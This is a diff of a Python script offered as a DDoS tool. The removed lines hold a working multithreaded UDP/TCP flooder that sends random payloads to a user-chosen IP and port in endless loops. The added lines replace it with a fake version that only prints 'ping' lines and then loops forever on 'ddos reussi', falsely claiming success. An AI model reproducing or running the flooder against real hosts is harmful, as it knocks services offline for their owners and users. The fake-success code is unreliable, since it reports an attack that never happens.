@@ -60,51 +60,18 @@ print("""\033[31m
 """)
 time.sleep(2)
 
-print("\033[31m ━━━\033[33m Kenal Gzaaxyz? (y/n)")
-choice = str(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-time.sleep(0.25)
-print("\033[31m ━━━\033[33m (UDP/TCP)")
-choice = str(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-time.sleep(0.25)
-print("\033[31m ━━━\033[33m Host/IP")
-ip = str(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-time.sleep(0.25)
-print("\033[31m ━━━\033[33m Port")
-port = int(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-time.sleep(0.25)
-print("\033[31m ━━━\033[33m Pakets [Min Pakets 100] ")	
-times = int(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-time.sleep(0.25)
-print("\033[31m ━━━\033[33m Threads [Min Threads 100] ")
-threads = int(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-def udp():
-	data = random._urandom(900)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(+"\033[91m Attacking Ip %s \033[93m Port %s"%(ip,port))
-		except:
-			print("\033[91m Server %s Has Been Maintenance %s"%(ip,port))
-def tcp():
-	data = random._urandom(3016)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-		except:
-			s.close()
-			print("\033[91m Attacking Ip %s \033[95m Port %s"%(ip,port))
+from colorama import Fore, Back, Style, init
+import pyfiglet
 
-for y in range(threads):
-    if choice == 'UDP':
-        th = threading.Thread(target = udp)
-        th.start()
-    elif choice == 'TCP':
-        th = threading.Thread(target = tcp)
-        th.start()
+Tata = "BiteDDos"
+ASCII_art_1 = pyfiglet.figlet_format(Tata)
+print(ASCII_art_1)
+init()
+print("\033[31m ━━━\033[33m Ваша Цель Ddoss")
+x = str(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
+z =1
+while z <= 15000 :
+    print(z ," ping :", x)
+    z+=1
+while True:
+     print("ddos reussi")
